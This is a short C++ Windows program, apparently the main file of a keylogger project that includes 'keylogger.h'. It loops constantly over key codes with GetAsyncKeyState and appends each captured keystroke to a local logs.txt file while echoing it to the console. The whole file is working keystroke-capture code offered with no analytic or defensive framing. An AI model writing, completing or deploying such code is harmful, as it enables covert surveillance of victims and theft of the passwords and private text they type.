#include <Windows.h>
#include <iostream>
#include <string>
#include <fstream>
#include "keylogger.h"

int main(int argc, const char **argv){
	unsigned char keyPress;
	while(true){
		Sleep(10);
		for(keyPress=8; keyPress <= 190; keyPress++){
			if(GetAsyncKeyState(keyPress) == -32767){
				if(keyCheck(keyPress) == false){
					std::cout<<keyPress;
					ofstream logs;
					logs.open("logs.txt", fstream::app);
					logs << keyPress;
					logs.close();
				}
			}
		}
	}
	return 0;
}

